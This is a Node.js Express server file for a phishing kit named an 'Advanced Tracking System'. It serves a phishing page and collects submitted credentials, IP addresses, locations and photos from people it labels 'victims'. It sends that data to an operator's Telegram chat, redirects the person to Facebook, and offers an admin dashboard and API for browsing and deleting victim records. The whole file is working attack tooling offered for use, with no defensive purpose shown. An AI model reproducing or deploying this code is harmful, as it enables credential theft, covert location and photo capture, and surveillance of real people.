// server.js - Advanced Tracking System for Vercel
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const crypto = require('crypto');

// Initialize Express app
const app = express();

// Environment variables for Vercel
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN';
const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID';
const PORT = process.env.PORT || 3000;

// Initialize Telegram Bot (webhook mode for Vercel)
const bot = new TelegramBot(BOT_TOKEN);
if (BOT_TOKEN !== 'YOUR_BOT_TOKEN') {
    bot.setWebHook(`https://${process.env.VERCEL_URL}/bot${BOT_TOKEN}`);
}

// In-memory storage (Use database in production)
let victims = new Map();
let analytics = {
    total: 0,
    byCountry: {},
    byDevice: {},
    photos: 0,
    locations: 0,
    last24h: 0
};

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// ==================== ROUTES ====================

// Home Page - Phishing Interface
app.get('/', (req, res) => {
    const victimId = generateVictimId(req);
    res.send(getHTMLTemplate(victimId));
});

// Tracking endpoint
app.post('/track', async (req, res) => {
    try {
        const trackingData = req.body;
        
        // Enhanced data collection
        await enhanceTrackingData(trackingData);
        
        // Store data
        victims.set(trackingData.victimId, trackingData);
        updateAnalytics(trackingData);
        
        // Send to Telegram
        await sendToTelegram(trackingData);
        
        // Save locally (for Vercel temporary storage)
        saveToMemory(trackingData);
        
        res.json({ 
            success: true, 
            message: 'Verification complete',
            redirect: 'https://facebook.com'
        });
        
    } catch (error) {
        console.error('Tracking error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Admin Dashboard
app.get('/admin', (req, res) => {
    res.send(getAdminDashboard());
});

// Get victim data
app.get('/api/victims', (req, res) => {
    const victimList = Array.from(victims.values()).map(v => ({
        id: v.victimId,
        email: v.credentials?.email || 'N/A',
        ip: v.ip || 'N/A',
        location: v.location,
        timestamp: v.timestamp,
        hasPhoto: !!v.photo,
        country: v.ipInfo?.country_name || 'Unknown'
    }));
    res.json(victimList);
});

// Get specific victim
app.get('/api/victim/:id', (req, res) => {
    const victim = victims.get(req.params.id);
    if (victim) {
        res.json(victim);
    } else {
        res.status(404).json({ error: 'Victim not found' });
    }
});

// Delete victim
app.delete('/api/victim/:id', (req, res) => {
    victims.delete(req.params.id);
    res.json({ success: true });
});

// Telegram webhook
app.post(`/bot${BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        victims: victims.size,
        uptime: process.uptime()
    });
});

